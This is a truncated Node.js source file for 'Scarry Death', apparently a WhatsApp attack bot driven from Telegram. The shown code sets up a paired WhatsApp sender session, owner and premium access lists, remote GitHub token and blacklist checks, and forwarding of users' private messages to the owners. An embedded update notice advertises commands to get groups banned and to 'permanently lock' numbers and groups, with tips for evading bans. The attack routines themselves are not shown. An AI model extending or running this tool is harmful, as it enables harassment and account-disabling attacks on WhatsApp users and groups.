const EventEmitter = require('events');

// Naikin limit listener biar gak error
EventEmitter.defaultMaxListeners = 100;
const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  generateMessageTag,
  timestamp,
  InteractiveMessage,
  Header
} = require('@sanzope/bails');

const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const { Client } = require("ssh2");
const pino = require("pino");
const crypto = require("crypto");
const path = require("path");
const httpMod = require('http')
const httpsMod = require('https')
const readline = require('readline');
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const mime = require("mime-types");
const BOT_TOKEN = config.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const { GoogleGenerativeAI } = require("@google/generative-ai");
const ONLY_FILE = path.join(__dirname, "SINGGLE ERA", "GroupOnly.json");
const cd = path.join(__dirname, "SINGGLE ERA", "Cooldown.json");
const blacklistFile = path.join(__dirname, "SINGGLE ERA", "blacklist.json");
let userPhotos = {};
const ppFile = "./SINGGLE ERA/ppmenu.json";
const userAudios = {}; // simpan audio menu
const AUTOJOIN_DB = path.join(__dirname, "SINGGLE ERA", "autojoin.json");

// load database
let autoJoinSettings = { enabled: false, links: [] };

if (fs.existsSync(AUTOJOIN_DB)) {
  try {
    autoJoinSettings = JSON.parse(fs.readFileSync(AUTOJOIN_DB));
  } catch {
    autoJoinSettings = { enabled: false, links: [] };
  }
}

// save database
function saveAutoJoin() {
  fs.writeFileSync(AUTOJOIN_DB, JSON.stringify(autoJoinSettings, null, 2));
}
async function isUserJoinedAll(bot, userId, links) {
  for (let link of links) {
    try {
      let username = link.replace("https://t.me/", "").replace("@", "");

      let res = await bot.getChatMember(`@${username}`, userId);

      if (!["member", "administrator", "creator"].includes(res.status)) {
        return false;
      }

    } catch (err) {
      return false;
    }
  }
  return true;
}

let sock = null;
// Load kalau file ada
if (fs.existsSync(ppFile)) {
  userPhotos = JSON.parse(fs.readFileSync(ppFile));
}

// Simpan ke database
function saveProfilPhosodb() {
  fs.writeFileSync(ppFile, JSON.stringify(userPhotos, null, 2));
}

let blacklistedCommands = [];
let commandUsage = {};
const userStartToCpanel = {};

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/sukaicecreamm-dev/DATABASE-SCARRYDEATHNEW/refs/heads/main/tokensdbscry.json"
const CONTROL_URL = "https://raw.githubusercontent.com/Raraaimupp/themainstaller/refs/heads/main/blaclist.text";
const { OWNER_ID, NOTIF_ID } = require("./config");
let waMonitoring = false;
const NOTIF_TARGET_ID = NOTIF_ID;
const GITHUB_TOKEN = config.GITHUB_TOKEN || ""; // konfigurasi: config.js (rotasi token GitHub lama) 
// === DETEKSI PERUBAHAN TEXT GITHUB RAW SCARRY DEATH ===

// URL RAW FILE (isi hanya on1 / on2 / on3 / dll)
const RAW_STATUS_URL = "https://raw.githubusercontent.com/Raraaimupp/updatescarry/refs/heads/main/teks.txt";

let lastHash = null;           // hash terakhir yang disimpan di RAM
let hasNotified = false;       // mencegah kirim dua kali

// ===============================
// 🔥 ANIMASI LOADING UPDATE
// ===============================
async function showUpdateLoading(bot, chatId) {
    const bars = [
        "▰▱▱▱▱ 10%",
        "▰▰▱▱▱ 20%",
        "▰▰▰▱▱ 30%",
        "▰▰▰▰▱ 40%",
        "▰▰▰▰▰ 50%",
        "▰▰▰▰▰▰ 60%",
        "▰▰▰▰▰▰▰ 70%",
        "▰▰▰▰▰▰▰▰ 80%",
        "▰▰▰▰▰▰▰▰▰ 90%",
        "▰▰▰▰▰▰▰▰▰▰ 100%"
    ];

    let msg = await bot.sendMessage(
        chatId,
        `<blockquote>PROSES UPDATE SCARRY DEATH...</blockquote>\n${bars[0]}`,
        { parse_mode: "HTML" }
    );

    // animasi progres
    for (let i = 1; i < bars.length; i++) {
        await new Promise(res => setTimeout(res, 350));
        await bot.editMessageText(
            `<blockquote>PROSES UPDATE SCARRY DEATH...</blockquote>\n${bars[i]}`,
            { chat_id: chatId, message_id: msg.message_id, parse_mode: "HTML" }
        );
    }

    // hapus pesan animasi
    await new Promise(res => setTimeout(res, 500));
    await bot.deleteMessage(chatId, msg.message_id);
}

// =====================================================
// 🔥 KIRIM NOTIF KALAU GWE UPDATE
// =====================================================
async function sendUpdateNotification(bot, ownerId) {

   const text = `
\`\`\`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃        ✦ 𝗨𝗣𝗗𝗔𝗧𝗘 𝗟𝗜𝗦𝗧 ✦        ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
🚀 SCRIPT SCARRY DEATH • UPDATE FITUR
━━━━━━━━━━━━━━━━━
✅ FIXXED FITURE BUGS GROUP
/banindo (banned group fresh/old)
/lockchat (lock number permanen tergantung lolosnya)
➜ Wajib Nomer Old Tidak Di Sarankan Pakai Sender Fresh
✅ UPDATE FITURE BUGS GROUP
/lockgc (lock group permanen tergantung lolosnya)
➜ anti banned Nokwa Fresh 85-90% Work Nokos New Baru Daftar
━━━━━━━━━━━━━━━━━━
⚙️ SYSTEM INFO
Bot berjalan otomatis dengan sistem multi-panel dan tanpa konfigurasi manual.
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃      ✦ Scarry Death LOG ✦      ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\`
`;

    return bot.sendMessage(ownerId, text, {
    parse_mode: "Markdown",
    disable_web_page_preview: true
});
}


// =====================================================
// 🔥 CEK PERUBAHAN RAW GITHUB
// =====================================================
async function checkRawChange() {
    try {
        const res = await axios.get(RAW_STATUS_URL, {
            timeout: 15000,
            headers: { "User-Agent": "Mozilla/5.0" }
        });

        const text = String(res.data).trim();
        const hash = crypto.createHash("sha256").update(text).digest("hex");

        // *** KIRIM HANYA KALAU BENAR-BENAR ADA PERUBAHAN ***
        if (lastHash !== null && hash !== lastHash && !hasNotified) {

            hasNotified = true; // biar tidak spam

            // lakukan loading animasi + hapus otomatis
            if (Array.isArray(OWNER_ID)) {
                for (const id of OWNER_ID) {
                    await showUpdateLoading(bot, id);
                    await sendUpdateNotification(bot, id);
                }
            } else {
                await showUpdateLoading(bot, OWNER_ID);
                await sendUpdateNotification(bot, OWNER_ID);
            }

            console.log("✓ Update terdeteksi — notifikasi terkirim!");
        }

        // simpan hash terbaru
        lastHash = hash;

    } catch (err) {
        console.log("❌ Error deteksi update:", err.message);
    }
}

// Cek status setiap 10 detik (10000 ms), bukan 10 ms.
setInterval(checkRawChange, 10 * 1000);

async function validateToken() {
  try {
    startBot();

    console.log("🚀 [SYSTEM] Bot starting...");

    // AUTO CONNECT WA
    await autoStart();

    console.log("✅ [SYSTEM] Bot ready");

  } catch (err) {
    console.error("❌ [SYSTEM ERROR]:", err);
  }
}


function startBot() {
  const scarry = [
    "███████╗ ██████╗ █████╗ ██████╗ ██████╗ ██╗   ██╗",
    "██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝",
    "███████╗██║     ███████║██████╔╝██████╔╝ ╚████╔╝",
    "╚════██║██║     ██╔══██║██╔══██╗██╔══██╗  ╚██╔╝",
    "███████║╚██████╗██║  ██║██║  ██║██║  ██║   ██║",
    "╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝"
  ];

  const death = [
    "██████╗ ███████╗ █████╗ ████████╗██╗  ██╗",
    "██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║  ██║",
    "██║  ██║█████╗  ███████║   ██║   ███████║",
    "██║  ██║██╔══╝  ██╔══██║   ██║   ██╔══██║",
    "██████╔╝███████╗██║  ██║   ██║   ██║  ██║",
    "╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝"
  ];

  const colors = [
    [0, 229, 255],
    [120, 100, 255],
    [190, 85, 255],
    [255, 80, 170]
  ];

  const gradient = (text) => {
    return [...text].map((char, i) => {
      if (char === " ") return char;

      const pos = (i / Math.max(text.length - 1, 1)) *
        (colors.length - 1);

      const index = Math.min(
        Math.floor(pos),
        colors.length - 2
      );

      const mix = pos - index;

      const rgb = colors[index].map((v, j) =>
        Math.round(
          v + (colors[index + 1][j] - v) * mix
        )
      );

      const hex = "#" + rgb
        .map(v => v.toString(16).padStart(2, "0"))
        .join("");

      return chalk.hex(hex).bold(char);
    }).join("");
  };

  const width = Math.max(
    ...scarry.map(x => x.length)
  );

  const center = (text) =>
    " ".repeat(
      Math.max(0, Math.floor((width - text.length) / 2))
    ) + text;

  const divider = "━".repeat(width);

  const info = (label, value, color = "#E9D5FF") => {
    console.log(
      chalk.hex("#8B5CF6")("  ├─ ") +
      chalk.hex("#9CA3C1")(label.padEnd(15)) +
      chalk.hex(color).bold(value)
    );
  };

  console.log("\n");
  console.log(gradient(divider));
  console.log("");

  scarry.forEach(line => {
    console.log(gradient(center(line)));
  });

  console.log("");

  death.forEach(line => {
    console.log(gradient(center(line)));
  });

  console.log("");
  console.log(gradient(divider));

  console.log(
    "\n" +
    chalk.hex("#A78BFA").bold(
      center("✦  S C A R R Y  D E A T H  ✦")
    )
  );

  console.log(
    chalk.hex("#67E8F9")(
      center("PREMIUM SYSTEM • STEALTH PROTOCOL")
    )
  );

  console.log("\n" + chalk.hex("#8B5CF6")(
    "  ╭───〔 SYSTEM INFORMATION 〕"
  ));

  info("STATUS", "● CONNECTED", "#4ADE80");
  info("SCRIPT", "SCARRY DEATH", "#F9A8D4");
  info("VERSION", "42.1 Pro", "#67E8F9");
  info("SYSTEM", "INITIALIZED", "#4ADE80");

  console.log(chalk.hex("#8B5CF6")(
    "  │"
  ));

  console.log(chalk.hex("#8B5CF6")(
    "  ├───〔 DEVELOPER TEAM SCRIPT 〕"
  ));

  info("-# DEVELOPER", "@callmymell");
  info("-# DEVELOPER", "@ikyymaunikah");
  info("-# DEVELOPER", "@Fidzkalcer1");
  info("-# DEVELOPER", "@z1perr2");
  info("-# DEVELOPER", "@profilrayzen");

  console.log(chalk.hex("#8B5CF6")(
    "  │"
  ));

  console.log(chalk.hex("#8B5CF6")(
    "  ╰───〔 SECURITY PROTOCOL 〕"
  ));

  console.log(
    "\n" +
    chalk.hex("#4ADE80").bold(
      "    ◉ STEALTH PROTOCOL ACTIVATED"
    )
  );

  console.log(
    chalk.hex("#F9A8D4").italic(
      '    "Silence is our loudest weapon."'
    )
  );

  console.log(
    "\n" +
    chalk.hex("#A5B4FC")(
      "    Bergerak dalam senyap."
    ) +
    "\n" +
    chalk.hex("#C4B5FD")(
      "    Menguasai tanpa suara."
    ) +
    "\n" +
    chalk.hex("#F0ABFC")(
      "    Kekuatan sejati lahir dari bayangan."
    )
  );

  console.log(
    "\n" +
    gradient(center("✦ WELCOME TO SCARRY DEATH ✦"))
  );

  console.log(gradient(divider));
  console.log(
    chalk.hex("#8B5CF6")(
      center("© SCARRY DEATH • ALL RIGHTS RESERVED")
    )
  );
  console.log(gradient(divider) + "\n");
}

validateToken();

// ========================================
// MONITOR PRIVATE + REPLY BUTTON SYSTEM
// ========================================
const OWNER_IDS = (config.OWNER_ID || []).map(String);
const monitorMap = new Map();       // key => meta data
const ownerReplyState = new Map();  // ownerId => key (aktif hanya setelah klik)

function isOwner(id) {
  return OWNER_IDS.includes(String(id));
}

function escapeHtml(str) {
  return String(str || "")
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;");
}

function makeKey() {
  return (Date.now().toString(36) + Math.random().toString(36).slice(2, 8));
}

function summarizeMsg(msg) {
  if (msg.text) return msg.text;
  if (msg.caption) return msg.caption;
  if (msg.photo) return "📷 Photo";
  if (msg.video) return "🎥 Video";
  if (msg.document) return "📄 Document";
  if (msg.voice) return "🎤 Voice";
  if (msg.audio) return "🎧 Audio";
  return "📩 Message";
}

// =============================
// PRIVATE MESSAGE MONITOR
// =============================
bot.on("message", async (msg) => {
  try {
    if (!msg?.chat) return;

    // OWNER MESSAGE
    if (isOwner(msg.from?.id)) {

      // Jangan teruskan command
      if (msg.text && msg.text.startsWith("/")) return;

      const key = ownerReplyState.get(String(msg.from.id));
      if (!key) return; // tidak dalam mode balas

      const meta = monitorMap.get(key);
      if (!meta) return;

      ownerReplyState.delete(String(msg.from.id)); // matikan mode

      const targetChatId = meta.chatId;
      const replyTo = meta.replyToMessageId;

      // Kirim sesuai tipe
      if (msg.text) {
        await bot.sendMessage(targetChatId, msg.text, { reply_to_message_id: replyTo });
      } else if (msg.photo) {
        const fid = msg.photo[msg.photo.length - 1].file_id;
        await bot.sendPhoto(targetChatId, fid, { caption: msg.caption || "", reply_to_message_id: replyTo });
      } else if (msg.video) {
        await bot.sendVideo(targetChatId, msg.video.file_id, { caption: msg.caption || "", reply_to_message_id: replyTo });
      } else if (msg.document) {
        await bot.sendDocument(targetChatId, msg.document.file_id, { caption: msg.caption || "", reply_to_message_id: replyTo });
      } else if (msg.voice) {
        await bot.sendVoice(targetChatId, msg.voice.file_id, { reply_to_message_id: replyTo });
      } else if (msg.audio) {
        await bot.sendAudio(targetChatId, msg.audio.file_id, { reply_to_message_id: replyTo });
      } else if (msg.sticker) {
        await bot.sendSticker(targetChatId, msg.sticker.file_id, { reply_to_message_id: replyTo });
      }

      const confirm =
`<blockquote>✅ <b>Pesan berhasil diteruskan ke target</b></blockquote>`;

      await bot.sendMessage(msg.chat.id, confirm, { parse_mode: "HTML" });

      return;
    }

    // =============================
    // PRIVATE USER (FORWARD TO OWNER)
    // =============================
    if (msg.chat.type === "private") {

      const key = makeKey();
      monitorMap.set(key, {
        chatId: msg.chat.id,
        replyToMessageId: msg.message_id,
      });

      const preview = summarizeMsg(msg);

      const html =
`<blockquote>🔔 <b>PRIVATE MESSAGE</b></blockquote>
<blockquote><b>👤 Nama:</b> ${escapeHtml(msg.from.first_name || "")}</blockquote>
<blockquote><b>🔗 Username:</b> ${escapeHtml(msg.from.username ? "@" + msg.from.username : "Tidak ada")}</blockquote>
<blockquote><b>🆔 ID:</b> <code>${escapeHtml(String(msg.from.id))}</code></blockquote>
<blockquote><b>📝 Preview:</b> ${escapeHtml(preview)}</blockquote>`;

      const markup = {
        inline_keyboard: [
          [{ text: "✉️ Balas", callback_data: `reply:${key}` }]
        ]
      };

      for (const ownerId of OWNER_IDS) {
        await bot.sendMessage(ownerId, html, {
          parse_mode: "HTML",
          reply_markup: markup
        });

        try {
          await bot.forwardMessage(ownerId, msg.chat.id, msg.message_id);
        } catch {}
      }
    }

  } catch {}
});
// ===============================
// DETEKSI BOT DITAMBAHKAN KE GROUP
// ===============================
let _botMeCache = null;
async function getBotMeCached() {
  if (_botMeCache) return _botMeCache;
  _botMeCache = await bot.getMe().catch(() => null);
  return _botMeCache;
}

function userInfo(from) {
  const full = `${(from?.first_name || "").trim()} ${(from?.last_name || "").trim()}`.trim() || "Unknown";
  const username = from?.username ? `@${from.username}` : "(no username)";
  const id = from?.id != null ? String(from.id) : "-";
  return { full, username, id };
}

function chatInfo(chat) {
  const title = chat?.title || "Unknown";
  const id = chat?.id != null ? String(chat.id) : "-";
  const type = chat?.type || "unknown";
  return { title, id, type };
}

async function notifyOwnersHTML(html) {
  for (const ownerId of OWNER_IDS) {
    try {
      await bot.sendMessage(ownerId, html, {
        parse_mode: "HTML",
        disable_web_page_preview: true,
      });
    } catch {}
  }
}

// 1) Deteksi paling umum: service message new_chat_members (ada yang add bot)
bot.on("message", async (msg) => {
  try {
    if (!msg?.chat) return;

    // hanya group/supergroup
    if (msg.chat.type !== "group" && msg.chat.type !== "supergroup") return;

    // cek apakah ada new members
    const newMembers = msg.new_chat_members || [];
    if (!newMembers.length) return;

    const me = await getBotMeCached();
    const botId = me?.id;
    if (!botId) return;

    // apakah bot termasuk yang ditambahkan?
    const botAdded = newMembers.some((m) => m?.id === botId);
    if (!botAdded) return;

    const u = userInfo(msg.from); // orang yang menambahkan
    const c = chatInfo(msg.chat);

    const html =
`<blockquote>⚠️ <b>BOT DITAMBAHKAN KE GROUP</b></blockquote>
<blockquote><b>👤 Ditambahkan oleh:</b> ${escapeHtml(u.full)}</blockquote>
<blockquote><b>🔗 Username:</b> ${escapeHtml(u.username)}</blockquote>
<blockquote><b>🆔 User ID:</b> <code>${escapeHtml(u.id)}</code></blockquote>
<blockquote><b>🏷️ Group:</b> ${escapeHtml(c.title)}</blockquote>
<blockquote><b>🧾 Chat ID:</b> <code>${escapeHtml(c.id)}</code></blockquote>
<blockquote><b>📌 Type:</b> <code>${escapeHtml(c.type)}</code></blockquote>`;

    await notifyOwnersHTML(html);

  } catch {}
});


// 2) Deteksi lebih akurat: my_chat_member (status bot berubah jadi member/admin)
// Ini kepake kalau bot diangkat jadi admin juga, atau kasus tertentu yang gak muncul new_chat_members
bot.on("my_chat_member", async (upd) => {
  try {
    const chat = upd?.chat;
    if (!chat) return;

    // hanya group/supergroup/channel
    if (!["group", "supergroup", "channel"].includes(chat.type)) return;

    const oldStatus = upd?.old_chat_member?.status;
    const newStatus = upd?.new_chat_member?.status;

    if (!newStatus || newStatus === oldStatus) return;

    // status masuk: member/admin
    if (newStatus === "member" || newStatus === "administrator") {
      const u = userInfo(upd.from);
      const c = chatInfo(chat);

      const html =
`<blockquote>⚠️ <b>BOT ROLE UPDATE</b></blockquote>
<blockquote><b>👤 Oleh:</b> ${escapeHtml(u.full)}</blockquote>
<blockquote><b>🔗 Username:</b> ${escapeHtml(u.username)}</blockquote>
<blockquote><b>🆔 User ID:</b> <code>${escapeHtml(u.id)}</code></blockquote>
<blockquote><b>📌 Lokasi:</b> ${escapeHtml(c.title)}</blockquote>
<blockquote><b>🧾 Chat ID:</b> <code>${escapeHtml(c.id)}</code></blockquote>
<blockquote><b>🔄 Status:</b> <code>${escapeHtml(oldStatus || "-")} → ${escapeHtml(newStatus)}</code></blockquote>`;

      await notifyOwnersHTML(html);
    }
  } catch {}
});
bot.on("callback_query", async (callbackQuery) => {
  try {

    const data = callbackQuery?.data || "";
    const ownerId = String(callbackQuery.from.id);

    // =============================
    // REPLY SYSTEM ROUTER
    // =============================
    if (data.startsWith("reply:")) {

      if (!isOwner(ownerId)) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "Bukan owner.",
          show_alert: true
        });
        return;
      }

      const key = data.split("reply:")[1];
      ownerReplyState.set(ownerId, key);

      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "Mode balas aktif.",
        show_alert: false
      });

      const html =
`<blockquote>✉️ <b>MODE BALAS AKTIF</b></blockquote>
<blockquote>Ketik pesan sekarang untuk diteruskan ke user tersebut.</blockquote>`;

      await bot.sendMessage(ownerId, html, { parse_mode: "HTML" });

      return;
    }

    // =============================
    // MENU HANDLER KAMU DI BAWAH SINI
    // =============================

    // lanjutkan kode menu kamu...

  } catch (err) {
    console.log("Callback error:", err);
  }
});
const PREMIUM_FILE = 'KANJUT HIDENG/premium.json';
const ADMIN_FILE = 'KANJUT HIDENG/admin.json';

function loadJsonFile(filePath, defaultData = []) {
  try {
    if (fs.existsSync(filePath)) {
      const fileData = fs.readFileSync(filePath, 'utf-8');
      return JSON.parse(fileData);
    } else {
      fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
      return defaultData;
    }
  } catch (error) {
    console.error(`Error reading or parsing ${filePath}, resetting file:`, error);
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    return defaultData;
  }
}

let premiumUsers = loadJsonFile(PREMIUM_FILE);
let adminUsers = loadJsonFile(ADMIN_FILE);

function savePremiumUsers() {
  try {
    fs.writeFileSync(PREMIUM_FILE, JSON.stringify(premiumUsers, null, 2));
  } catch (error) {
    console.error('Failed to save premium users:', error);
  }
}

function saveAdminUsers() {
  try {
    fs.writeFileSync(ADMIN_FILE, JSON.stringify(adminUsers, null, 2));
  } catch (error) {
    console.error('Failed to save admin users:', error);
  }
}

function premium(userId) {
  return premiumUsers.some(
    (user) => user.id === userId && new Date(user.expiresAt) > new Date()
  );
}

let deviceList = [];
const SESSION_PATH = "./session";

// cek koneksi
let pairingTargetChatId = null;
let waConnectionState = 'close';
let scarryLogoutTimer = null;
let scarryReconnectTimer = null;
let scarryLogoutGeneration = 0;
let scarryLastConfirmedSocket = null;

function cancelScarryLogoutCheck() {
  scarryLogoutGeneration++;
  if (scarryLogoutTimer) clearTimeout(scarryLogoutTimer);
  scarryLogoutTimer = null;
}
function cancelScarryReconnect() {
  if (scarryReconnectTimer) clearTimeout(scarryReconnectTimer);
  scarryReconnectTimer = null;
}

// Hanya mengirim notifikasi bila kode disconnect resmi = loggedOut
// DAN socket yang sama belum kembali online setelah 10 detik.
function scheduleScarryConfirmedLogout(closedSocket, reason) {
  if (scarryLogoutTimer || scarryLastConfirmedSocket === closedSocket) return;
  cancelScarryLogoutCheck();
  const generation = scarryLogoutGeneration;
  scarryLogoutTimer = setTimeout(async () => {
    scarryLogoutTimer = null;
    if (generation !== scarryLogoutGeneration || sock !== closedSocket || waConnectionState !== 'close') return;
    if (closedSocket?.ws?.readyState === 1) return; // Terhubung kembali
    scarryLastConfirmedSocket = closedSocket;
    const destinations = [...new Set([
      ...(Array.isArray(OWNER_IDS) ? OWNER_IDS : []),
      ...(NOTIF_TARGET_ID ? [String(NOTIF_TARGET_ID)] : [])
    ])];
    for (const chatId of destinations) {
      try {
        await sendScarrySenderCard(chatId, 'logout', { reason: String(reason || 'loggedOut') });
      } catch (error) {
        console.warn('[SCARRY LOGOUT ALERT]', error?.message || error);
      }
    }
  }, 10000);
}

const isWhatsAppConnected = () => {
    return waConnectionState === "open";
};
// --- Fungsi Device ---
const loadDeviceList = () => {
    try {
        deviceList = JSON.parse(fs.readFileSync('./ListDevice.json'));
    } catch {
        deviceList = [];
    }
};

const saveDeviceList = () => {
    fs.writeFileSync('./ListDevice.json', JSON.stringify(deviceList, null, 2));
};

const setSingleDevice = (userId, token) => {
    deviceList = [{ number: 1, userId, token }];
    saveDeviceList();
};

const clearSession = () => {
    try {
        if (fs.existsSync(SESSION_PATH)) {
            fs.rmSync(SESSION_PATH, { recursive: true, force: true });
            console.log("🗑️ Session berhasil dihapus");
        }
    } catch (err) {
        console.log("Gagal hapus session:", err);
    }
};

const addDeviceToList = (userId, token) => {
    const deviceNumber = deviceList.length + 1;
    deviceList.push({ number: deviceNumber, userId, token });
    saveDeviceList();
    console.log(chalk.green.bold(`New Sender Added: ${deviceNumber} | ${userId}`));
};

// --- Start WA Session ---
async function startSession() {
    try {
        console.log("🚀 Memulai WhatsApp session...");

        const { state, saveCreds } = await useMultiFileAuthState('./session');
        const { version } = await fetchLatestBaileysVersion();

        sock = makeWASocket({
            version,
            auth: state,
            logger: pino({ level: 'silent' }),
            browser: ['Windows', 'Chrome', '120.0.0'],
            keepAliveIntervalMs: 30000,
        });

        sock.ev.on('creds.update', saveCreds);
        const thisSocket = sock;
        cancelScarryReconnect();
        cancelScarryLogoutCheck();

        return new Promise((resolve) => {
            thisSocket.ev.on('connection.update', async (update) => {
                // Abaikan peristiwa dari koneksi lama setelah reconnect.
                if (sock !== thisSocket) return;
                const { connection, lastDisconnect } = update;

                if (connection === 'connecting') {
                    waConnectionState = 'connecting';
                    console.log("⏳ CONNECTING...");
                    resolve(true);
                }

                if (connection === 'open') {
                    waConnectionState = 'open';
                    scarryLastConfirmedSocket = null;
                    cancelScarryLogoutCheck();
                    cancelScarryReconnect();
                    console.log("🟢 CONNECTED");

                    if (pairingTargetChatId) {
                        await sendScarrySenderCard(pairingTargetChatId, 'connected');
                        pairingTargetChatId = null;
                    }
                }

                if (connection === 'close') {
                    waConnectionState = 'close';
                    const reason = lastDisconnect?.error?.output?.statusCode;
                    if (reason === DisconnectReason.loggedOut) {
                        cancelScarryReconnect();
                        console.warn('[SCARRY SENDER] loggedOut terdeteksi; verifikasi ulang 10 detik');
                        scheduleScarryConfirmedLogout(thisSocket, reason);
                    } else {
                        // Close sementara termasuk masalah jaringan: bukan logout.
                        cancelScarryLogoutCheck();
                        if (!scarryReconnectTimer) {
                            scarryReconnectTimer = setTimeout(() => {
                                scarryReconnectTimer = null;
                                if (sock === thisSocket && waConnectionState !== 'open') {
                                    startSession().catch(e => console.warn('[SCARRY RECONNECT]', e?.message || e));
                                }
                            }, 3000);
                        }
                    }
                    resolve(true);
                }
            });
        });

    } catch (err) {
        console.error("❌ ERROR START SESSION:", err);
    }
}

// ===== SCARRY DEATH • ADD SENDER RICH CARD =====
// Khusus presentasi UI. Tidak mengubah proses pairing/socket WhatsApp.
function scarrySenderEscape(value) {
  return String(value == null ? '' : value)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;')
    .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function buildScarrySenderCard(kind, info = {}) {
  const emoji = '<tg-emoji emoji-id="6206323928512602557">✨</tg-emoji>';
  const icon = '<tg-emoji emoji-id="5197288647275071607">🛡</tg-emoji>';
  const labels = {
    denied: ['AKSES DITOLAK', 'Hanya owner yang boleh menghubungkan sender.'],
    existing: ['SESSION SUDAH AKTIF', 'Gunakan /killsession sebelum menautkan sender baru.'],
    processing: ['MENYIAPKAN SENDER', 'Menghubungkan server WhatsApp dan meminta pairing code.'],
    timeout: ['PAIRING TIMEOUT', 'Pairing code belum tersedia. Silakan coba lagi.'],
    success: ['PAIRING CODE SIAP', 'Gunakan pairing code pada perangkat WhatsApp yang akan dihubungkan.'],
    connected: ['SENDER TERHUBUNG', 'Koneksi WhatsApp berhasil tersambung.'],
    logout: ['SESSION LOGOUT TERKONFIRMASI', 'Sesi benar-benar logout; status masih tertutup setelah 10 detik.'],
    failure: ['KONEKSI GAGAL', 'Proses penautan gagal. Periksa perangkat dan jaringan.']
  };
  const [title, description] = labels[kind] || labels.failure;
  const number = info.number ? scarrySenderEscape(info.number) : '-';
  const code = info.code ? scarrySenderEscape(info.code) : '';
  const state = {
    denied: 'Akses terbatas', existing: 'Sudah ada sesi', processing: 'Memproses',
    timeout: 'Waktu habis', success: 'Siap ditautkan', connected: 'Terhubung', logout: 'Logout permanen', failure: 'Gagal'
  }[kind] || '-';
  const rows = [
    ['STATUS', state],
    ['SENDER', number],
    ...(code ? [['PAIRING CODE', code]] : [])
  ];
  const table = '<table bordered striped compact>' +
    '<tr><th>INFORMASI</th><th>DETAIL</th></tr>' +
    rows.map(([k, v]) => `<tr><td>${scarrySenderEscape(k)}</td><td>${v}</td></tr>`).join('') +
    '</table>';
  const richHtml = [
    `<h2>${icon} SCARRY DEATH • ${scarrySenderEscape(title)}</h2>`,
    `<blockquote>${emoji} ${scarrySenderEscape(description)}</blockquote>`,
    table,
    code ? '<p>Tekan tombol salin untuk menggunakan pairing code.</p>' : '',
    code ? `<tg-button-row align="center"><tg-button type="copy_text" style="success" text="${code}">SALIN PAIRING CODE</tg-button></tg-button-row>` : '',
    '<footer>SCARRY DEATH • SENDER MANAGEMENT</footer>'
  ].filter(Boolean).join('\n');
  const plainHtml = [
    `<b>SCARRY DEATH • ${scarrySenderEscape(title)}</b>`,
    `<blockquote>${scarrySenderEscape(description)}</blockquote>`,
    `<b>Status:</b> ${scarrySenderEscape(state)}`,
    info.number ? `<b>Sender:</b> <code>${number}</code>` : '',
    code ? `<b>Pairing code:</b> <code>${code}</code>` : '',
    '<i>SCARRY DEATH • SENDER MANAGEMENT</i>'
  ].filter(Boolean).join('\n');
  return { richHtml, plainHtml, code };
}

async function sendScarrySenderCard(chatId, kind, info = {}) {
  const card = buildScarrySenderCard(kind, info);
  const rich = bot.__scarryRichInstalled;
  if (rich?.transport) {
    try {
      return await rich.transport('sendRichMessage', {
        chat_id: chatId, rich_message: { html: card.richHtml }
      });
    } catch (err) {
      const status = err?.response?.status ?? err?.response?.statusCode;
      // Fallback hanya untuk error permanen (bukan timeout jaringan agar tidak dobel).
      if (status !== 400 && status !== 404) throw err;
      console.warn('[SCARRY SENDER RICH FALLBACK]',
        String(err?.response?.data?.description || err.message || '').slice(0, 160));
    }
  }
  const options = { parse_mode: 'HTML', disable_rich: true };
  if (card.code) {
    options.reply_markup = { inline_keyboard: [[{
      text: 'SALIN PAIRING CODE', copy_text: { text: info.code }
    }]] };
  }
  return bot.sendMessage(chatId, card.plainHtml, options);
}
// ===== END SENDER RICH CARD =====

bot.onText(/\/addsender (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

